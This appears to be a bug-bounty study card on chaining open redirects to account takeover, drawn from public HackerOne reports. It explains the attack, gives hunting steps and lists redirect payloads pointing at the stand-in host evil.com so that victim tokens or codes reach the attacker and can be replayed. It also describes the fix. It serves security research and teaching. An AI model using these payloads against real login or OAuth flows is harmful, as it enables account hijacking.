---
name: open-redirect-to-ato
description: Open redirect chained to account takeover — the redirect URL carries a token/code that the destination receives. Teaches why open redirect is high-value: not phishing, but token theft in login/OAuth/SSO flows.
sources: hackerone_public
report_count: 1
---

# Open Redirect → Account Takeover

**Report**: cs.money — "Open Redirect Leads to Account Takeover" (hackerone.com/reports/905607, medium). Related: central.uber.com OR→ATO (#206591).

## Why it matters (the new lesson)
An open redirect alone is usually rated "low/medium (phishing)". It becomes **critical/ATO** when the redirect target is the next hop in a sensitive flow (login, OAuth callback, SSO) and the URL carries a token/code/authz. If `redirect=` isn't validated, the token is delivered to your domain.

## How it works
```
https://target/login?redirect_uri=https://evil.com&token=<victim token>
```
Or: user completes auth, the app redirects to `redirect_uri` (attacker-controlled) WITH the code/token in the fragment/query; attacker's page reads it and replays.

## How to hunt for it
1. Map every `redirect=`, `return=`, `returnTo=`, `next=`, `continue=`, `dest=`, `url=`, `cb=` param in login/SSO/OAuth/logout flows.
2. Set it to your domain; after auth completes, check the Referer/request your server receives for tokens/codes/state.
3. Verify token replay grants access (ATO).

## Payloads
```
?redirect=https://evil.com
?redirect_uri=https://evil.com/callback
?returnUrl=https://evil.com
?next=//evil.com   (protocol-relative)
```

## Fix
Validate redirect against an allowlist (exact match); never place tokens in redirect URL (use fragment + PKCE + POST); strip external destinations.
